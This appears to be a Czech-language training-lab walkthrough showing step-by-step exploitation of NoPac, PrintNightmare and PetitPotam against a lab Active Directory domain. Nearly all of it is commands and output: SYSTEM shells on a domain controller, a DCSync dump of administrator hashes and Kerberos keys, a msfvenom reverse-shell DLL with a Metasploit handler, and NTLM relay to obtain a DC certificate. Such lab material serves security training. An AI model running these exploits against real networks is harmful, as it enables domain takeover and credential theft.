
## NoPac (SamAccountName Spoofing)

Skvělým příkladem vznikající hrozby je zranitelnost _Sam_The_Admin_, nazývaná také _noPac_ nebo _SamAccountName Spoofing_, která byla zveřejněna na konci roku 2021. Tato zranitelnost zahrnuje dvě CVE (CVE-2021-42278 a CVE-2021-42287), které umožňují zvýšení oprávnění v rámci domény z jakéhokoli běžného doménového uživatele na úroveň Domain Admin pomocí jediného příkazu. Tato cesta zneužití (exploit path) využívá možnost změnit `SamAccountName` počítačového účtu na název doménového řadiče (Domain Controller). Ve výchozím nastavení mohou ověření uživatelé přidat do domény až deset počítačů. Při tom změníme název nového hostitele tak, aby odpovídal `SamAccountName` doménového řadiče. Jakmile je to hotovo, musíme požádat o lístky Kerberos, což způsobí, že nám služba vystaví lístky pod jménem doménového řadiče namísto nového názvu. Při vyžádání TGS (Ticket Granting Service) vystaví systém lístek s nejblíže odpovídajícím jménem. Jakmile je toto hotovo, získáme přístup jako tato služba a můžeme dokonce získat shell s oprávněním SYSTEM na doménovém řadiči.
### Ujištění se o instalaci Impacketu

Bash

```
michal08@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
michal08@htb[/htb]$ python setup.py install
```

### Klonování repozitáře s exploitem NoPac

Bash

```
michal08@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
```


```
michal08@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5.
Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

Existuje mnoho různých způsobů, jak použít NoPac k rozšíření našeho přístupu. Jedním ze způsobů je získání shellu s oprávněními úrovně SYSTEM. Toho můžeme dosáhnout spuštěním `noPac.py` s níže uvedenou syntaxí, abychom se vydávali za vestavěný účet administrátora (impersonate) a získali polointeraktivní relaci shellu na cílovém doménovém řadiči. Tento postup však může být „hlučný“ (snadno odhalitelný) nebo může být zablokován antivirem či EDR.

### Spuštění NoPac a získání shellu

Bash

```
michal08@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                               
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*]     Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
[-] Delete computer WIN-LWJFQMAXRVN$ Failed!
Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

Všimneme si, že se s cílem naváže polointeraktivní shell relace pomocí nástroje `smbexec.py`. Mějte na paměti, že u shellů typu `smbexec` budeme muset používat přesné cesty namísto navigování v adresářové struktuře pomocí příkazu `cd`. Je důležité poznamenat, že `NoPac.py` ukládá TGT do adresáře na útočném hostiteli, odkud byl exploit spuštěn. Pro potvrzení můžeme použít příkaz `ls`.
### Použití noPac k DCSyncu vestavěného účtu Administrator

Bash

```
michal08@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                                                    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
## PrintNightmare
```
## PrintNightmare

PrintNightmare je označení (přezdívka) pro dvě zranitelnosti (CVE-2021-34527 a CVE-2021-1675) nalezené ve službě Print Spooler (Tiskové zařazování), která běží na všech operačních systémech Windows. Na základě těchto zranitelností bylo napsáno mnoho exploitů, které umožňují zvýšení oprávnění a vzdálené spuštění kódu (RCE). Využití této zranitelnosti pro lokální zvýšení oprávnění (LPE) je pokryto v modulu Windows Privilege Escalation, ale je také důležité si ji procvičit v kontextu prostředí Active Directory pro získání vzdáleného přístupu k hostiteli. Pojďme si procvičit jeden exploit, který nám umožní získat relaci shellu SYSTEM na doménovém řadiči běžícím na systému Windows Server 2019.
### Klonování exploitu

Bash

```
michal08@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```
### Instalace verze Impacketu od cube0x0

Bash

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
### Enumerace pro MS-RPRN

Bash

```
michal08@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```
### Generování DLL payloadu

Bash

```
michal08@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes
```
### Vytvoření sdílení pomocí smbserver.py

Bash

```
michal08@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
### Konfigurace a spuštění MSF multi/handler

Bash

```
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080
```
### Spuštění exploitu

Bash

```
michal08@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...

<ZKRÁCENO>
```
### Získání shellu SYSTEM

Bash

```
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
Process 5912 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## PetitPotam (MS-EFSRPC)

PetitPotam (CVE-2021-36942) je zranitelnost spoofingu LSA, která byla záplatována v srpnu roku 2021. Tato chyba umožňuje neověřenému útočníkovi vynutit (coerce) doménový řadič k autentizaci vůči jinému hostiteli pomocí NTLM přes port 445 prostřednictvím protokolu Local Security Authority Remote Protocol (LSARPC) zneužitím protokolu Encrypting File System Remote Protocol (MS-EFSRPC) společnosti Microsoft.
### Spuštění ntlmrelayx.py

Bash

```
michal08@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
...
[*] Servers started, waiting for connections
```
### Spuštění PetitPotam.py

Bash

```
michal08@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
                                                                                
              ___            _        _      _        ___            _                     
             |_ \   ___     | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | ' \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                   
                               by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!

[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```
### Zachycení certifikátu v kódování Base64 pro DC01

Zpět v našem druhém okně uvidíme v případě úspěšného útoku úspěšný požadavek na přihlášení a získáme certifikát pro doménový řadič kódovaný v Base64.

Bash

```
michal08@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
...
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKo
```
